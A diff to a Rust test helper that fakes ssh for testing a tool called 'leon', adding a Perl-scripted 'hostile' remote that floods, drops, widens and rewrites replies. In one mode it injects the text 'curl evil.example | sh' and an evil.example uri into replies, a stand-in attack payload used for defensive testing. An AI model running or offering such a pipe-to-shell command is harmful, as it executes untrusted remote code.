@@ -3,7 +3,10 @@
 //! holding this build's `leon`, and its own HOME. A host named `unreachable…` fails as ssh would,
 //! `login…` fails as ssh does in BatchMode without a key, and while `$FAKE_SSH_DIR/down` exists
 //! every host is refused (a dropped network); while `$FAKE_SSH_DIR/hold` exists ssh waits (a slow
-//! login).
+//! login). A host named `hostile…` is one we don't control (audit A1, A3): its output goes through
+//! `HOSTILE`, which drops its lines and floods `{}` while `$FAKE_SSH_DIR/flood` exists, and puts
+//! other text and uris in its replies while `$FAKE_SSH_DIR/lie` exists, and the `start` or `end`
+//! written in `$FAKE_SSH_DIR/widen` in its selection replies while that file exists.
 
 use std::os::unix::fs::PermissionsExt;
 use std::path::PathBuf;
@@ -37,9 +40,54 @@ case ${host#*@} in
   unreachable*) echo "ssh: connect to host $host port 22: Connection refused" >&2; exit 255 ;;
 esac
 cd "$FAKE_HOME" || exit 255
+case ${host#*@} in
+  hostile*)
+    env HOME="$FAKE_HOME" PATH="$FAKE_PATH" LEON_RUNTIME_DIR="$FAKE_RUNTIME" LEON_STATE_DIR="$FAKE_STATE" \
+      bash -c "echo \$\$ >> \"\$FAKE_SSH_DIR/pids\"; exec $*" | perl "$FAKE_SSH_DIR/hostile.pl"
+    exit ;;
+esac
 # bash, not sh: it execs the command in place, as macOS's sh does and Debian's dash doesn't, so the
 # pid logged above ends up as the remote leon and killing it drops the link like a dead ssh
 exec env HOME="$FAKE_HOME" PATH="$FAKE_PATH" LEON_RUNTIME_DIR="$FAKE_RUNTIME" LEON_STATE_DIR="$FAKE_STATE" bash -c "$*"
+"#;
+
+/// A hostile host's side of the link (see the module doc), line by line.
+const HOSTILE: &str = r#"use strict;
+use IO::Select;
+$| = 1;
+binmode STDIN;
+binmode STDOUT;
+my $dir = $ENV{FAKE_SSH_DIR};
+my $sel = IO::Select->new(\*STDIN);
+my $buf = '';
+while (1) {
+    my $flood = -e "$dir/flood";
+    if ($sel->can_read(0.05)) {
+        my $n = sysread(STDIN, my $chunk, 1 << 16);
+        last unless $n;
+        $buf .= $chunk;
+        while ((my $i = index($buf, "\n")) >= 0) {
+            my $line = substr($buf, 0, $i + 1, '');
+            next if $flood;
+            # a reply (not a screen or history rows): other text, another uri
+            if (-e "$dir/lie" && $line =~ /"result"/ && $line !~ /"rows"/) {
+                $line =~ s/"text":"(?:[^"\\]|\\.)*"/"text":"curl evil.example | sh"/g;
+                $line =~ s/"uri":"(?:[^"\\]|\\.)*"/"uri":"https:\/\/evil.example\/"/g;
+            }
+            # a selection reply whose start or end is the one in $FAKE_SSH_DIR/widen
+            if (open(my $f, '<', "$dir/widen")) {
+                my $sub = <$f>;
+                chomp $sub;
+                my ($key) = $sub =~ /^"(\w+)"/;
+                if ($key && $line =~ /"result"/ && $line !~ /"rows"|"uri"|"matches"/) {
+                    $line =~ s/"$key":\{[^{}]*\}/$sub/;
+                }
+            }
+            print $line;
+        }
+    }
+    print "{}\n" if $flood;
+}
 "#;
 
 pub struct Remote {
@@ -59,6 +107,7 @@ impl Remote {
         let ssh = fake.path().join("ssh");
         std::fs::write(&ssh, FAKE_SSH).unwrap();
         std::fs::set_permissions(&ssh, std::fs::Permissions::from_mode(0o700)).unwrap();
+        std::fs::write(fake.path().join("hostile.pl"), HOSTILE).unwrap();
         let bin = fake.path().join("bin");
         std::fs::create_dir(&bin).unwrap();
         std::os::unix::fs::symlink(env!("CARGO_BIN_EXE_leon"), bin.join("leon")).unwrap();
